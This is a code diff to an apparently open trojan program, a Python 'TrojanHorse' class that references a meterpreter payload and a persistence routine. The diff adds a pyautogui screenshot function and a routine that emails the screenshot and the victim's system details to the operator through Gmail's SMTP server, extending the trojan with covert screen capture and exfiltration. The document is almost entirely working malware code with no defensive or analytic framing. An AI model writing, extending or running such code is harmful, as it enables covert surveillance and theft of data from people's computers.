@@ -2,6 +2,16 @@
 
 import socket, struct, time   #Part of meterpreter Payload 
 import smtplib     #Reporting the TrojanHorse Started Message via Email
+#==============================================================
+# 4,8 to 11 lines for "send_mail_with_attachment()" function
+#==============================================================
+from email.mime.text import MIMEText              
+from email.mime.multipart import MIMEMultipart  
+from email.mime.application import MIMEApplication 
+from os.path import basename    
+#==============================================================
+import pyautogui  #To Capture Screenshot
+import tempfile  #To Return cross platform temp directory; Used in "take_screenshot()" function
 import os
 import shutil
 import subprocess
@@ -15,6 +25,7 @@ class TrojanHorse:
     def __init__(self, email, password, ip, port):
         self.log = ""
         self.email = email
+        self.temp_screenshot = tempfile.gettempdir() + "\\screenshot.png"
         self.password = password
         self.ip = ip
         self.port = port
@@ -44,12 +55,24 @@ class TrojanHorse:
         user = getpass.getuser()
         return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user
 
+    def take_screenshot(self):
+        try:
+            os.remove('screenshot.png')
+        except Exception as e:
+            pass
+        pic = pyautogui.screenshot()
+        temp_dir = tempfile.gettempdir()
+        os.chdir(temp_dir)
+        pic.save('screenshot.png')
+
     def start(self):        
         if self.log == "":
             pass
         else:
             try:
                 self.send_mail(self.log)
+                self.take_screenshot()
+                self.send_mail_with_attachment(files= [self.temp_screenshot])
             except Exception as e:
                 print(f"Error: {e}")
                 time.sleep(10)
@@ -80,6 +103,28 @@ class TrojanHorse:
         server.login(self.email, self.password)
         server.sendmail(self.email, self.email, message)
         server.quit()
+        
+    def send_mail_with_attachment(self, files= None):
+        msg = MIMEMultipart()
+        msg['From'] = self.email
+        msg['To'] = self.email  
+        msg['Subject'] = "TechnowHorse Reporting With Attachments"
+        text = "\nReport From:\n\n" + self.system_info 
+        msg.attach(MIMEText(text))
+
+        for f in files or []:
+            with open(f, "rb") as fil: 
+                ext = f.split('.')[-1:]
+                attachedfile = MIMEApplication(fil.read(), _subtype = ext)
+                attachedfile.add_header(
+                    'content-disposition', 'attachment', filename=basename(f) )
+            msg.attach(attachedfile)
+
+        smtp = smtplib.SMTP(host="smtp.gmail.com", port= 587) 
+        smtp.starttls()
+        smtp.login(self.email, self.password)
+        smtp.sendmail(self.email, self.email, msg.as_string())
+        smtp.close()    
 
     def become_persistent(self):
         if sys.platform.startswith("win"):
